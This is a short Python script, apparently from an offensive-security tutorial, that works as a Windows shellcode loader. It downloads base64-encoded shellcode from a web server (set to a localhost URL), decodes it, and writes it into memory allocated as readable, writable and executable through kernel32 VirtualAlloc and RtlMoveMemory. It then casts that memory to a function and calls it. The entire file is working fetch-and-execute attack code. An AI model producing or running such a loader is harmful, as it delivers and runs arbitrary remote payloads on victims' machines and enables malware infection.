from urllib import request
from ctypes import *

import base64

kernel32 = windll.kernel32

# retrieve the base64-encoded shellcode from web server
def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = c_void_p
    kernel32.RtlMoveMemory.argtypes = (c_void_p, c_void_p, c_size_t)

    # allocate the memory and move the buffer into the memory
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40) # 0x40 allow the memory to r/w/execute
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


def run(shellcode):
    # allocate a buffer to hold the shellcode, then write the buffer to memory
    buffer = create_string_buffer(shellcode)
    ptr = write_memory(buffer)

    shell_func = cast(ptr, CFUNCTYPE(None))
    shell_func()


if __name__ == '__main__':
    url = 'http://127.0.0.1:8000/shellcode.bin'
    shellcode = get_code(url)
    run(shellcode)
